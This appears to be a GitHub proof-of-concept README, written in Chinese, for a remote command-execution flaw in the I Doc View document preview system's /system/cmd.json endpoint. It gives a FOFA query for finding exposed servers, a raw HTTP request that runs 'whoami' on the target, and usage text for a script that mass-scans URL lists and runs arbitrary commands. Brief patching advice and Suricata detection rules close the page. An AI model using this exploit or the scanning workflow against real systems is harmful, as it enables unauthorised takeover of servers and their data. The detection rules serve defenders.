### 产品简介  
i Doc View是一个在线文档解析应用，旨在提供便捷的文件查看和编辑服务。  

### 漏洞概述  
iDocView是一个在线文档I Doc View在线文档预览系统cmd.json 处存在命令执行漏洞，攻击者可通过此漏洞获取服务器权限  

### 指纹识别  
fofa: title=="在线文档预览 - I Doc View"  

![Image text](https://github.com/YUUKI4O4/POC/blob/main/i_Doc_View_cmd_json-RCE/2.png)

### 漏洞利用  
```
poc:
GET /system/cmd.json?cmd=whoami HTTP/1.1
Host: you_ip
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh-HK;q=0.9,zh;q=0.8
Connection: close
```

![Image text](https://github.com/YUUKI4O4/POC/blob/main/i_Doc_View_cmd_json-RCE/1.png)

### 测试和利用脚本  
```
python3 i_Doc_View_cmd_json-RCE.py -h
usage: i_Doc_View_cmd_json-RCE.py [-h] [-t] [-r FILE] [-u URL] [-c URL CMD]

### I Doc View Online Document Preview System cms.json has RCE vulnerability. ###

options:
  -h, --help            show this help message and exit
  -t, --target_collection
                        Perform target collection
  -r FILE, --multi_objective_testing FILE
                        Perform multi-objective testing. e.g:python i_Doc_View_cmd_json-RCE.py -r
                        ./url.txt
  -u URL, --single_objective_testing URL
                        Perform single-objective testing. e.g:python i_Doc_View_cmd_json-RCE.py -u
                        http://xxx.xxx.xxx
  -c URL CMD, --rce URL CMD
                        Perform RCE. e.g:python i_Doc_View_cmd_json-RCE.py -c http://xxx.xxx.xxx whoami
```

### 修复建议  
1.联系相关软件厂商更新至最新安全版本。  
2.临时屏蔽system/cmd.json接⼝  

### Suricata rules  
```
alert http any any -> any any (msg:"i Doc View cmd.json RCE"; flow:established,to_server; flowbits:set,I_Doc_View; content:"get";http_method;nocase; content:"/system/cmd.json";http_uri;fast_pattern;nocase; content:"cmd=";http_uri;nocase; pcre:"/cmd=.*(id|whoami|exec|echo|>|&)/Ui"; reference:url,https://github.com/YUUKI4O4/POC/tree/main/i_Doc_View_cmd_json-RCE; classtype:web-rce; metadata:created_at 2023-12-22,updated_at 2023-12-22,creater:YUUKI4O4; sid:1; rev:1;)
alert http any any -> any any (msg:"i Doc View cmd.json RCE success"; flow:established,from_server; flowbits:isset,I_Doc_View; content:"200";http_stat_code; content:" application/json";nocase;http_header; content:"{";nocase;http_server_body; content:"data";nocase;http_server_body; pcre:"/\;<br />.*<br />&/Qi"; reference:url,https://github.com/YUUKI4O4/POC/tree/main/i_Doc_View_cmd_json-RCE; classtype:web-rce; metadata:created_at 2023-12-22,updated_at 2023-12-22,creater:YUUKI4O4; sid:2; rev:1;)
```
